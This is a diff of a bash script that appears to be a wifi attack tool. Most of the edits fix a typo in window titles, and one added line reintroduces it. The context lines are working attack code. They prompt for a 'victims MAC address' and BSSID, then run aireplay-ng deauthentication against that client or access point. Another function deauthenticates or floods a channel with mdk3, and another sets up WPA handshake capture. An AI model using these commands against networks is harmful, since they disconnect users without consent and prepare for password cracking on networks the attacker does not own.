@@ -131,7 +131,7 @@ read -p ":" r
 
 if [ $r == s ]
 then
-sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 echo -e "${B}${b}[+]${g}victims MAC address${s}"
 read -p ":" mac
 echo -e "${B}${b}[+]${g}BSSID address${s}"
@@ -141,7 +141,7 @@ read -p ":" num
 sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon
 
 else
-sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 echo -e "${B}${b}[+]${g}BSSID address${s}"
 read -p ":" bssid
 echo -e "${B}${b}[+]${g}number of deauth req${s}"
@@ -154,7 +154,7 @@ fi
 
 #deauth wifi channel
 mdk () {
-sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 echo -e "${B}${b}[+]${g}enter channel number${s}"
 read -p ":" channel
 echo -e "${B}${B}${y}[!]${r}press ( Ctrl + C ) to stop${s}"
@@ -181,6 +181,8 @@ sudo mdk3 wlan0mon b -c $channel -f $txt
 
 #capture handshake
 handshake () {
+
+sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 
 echo -e "${B}${b}[+]${g}enter BSSID address${s}"
 read -p ":" bssid
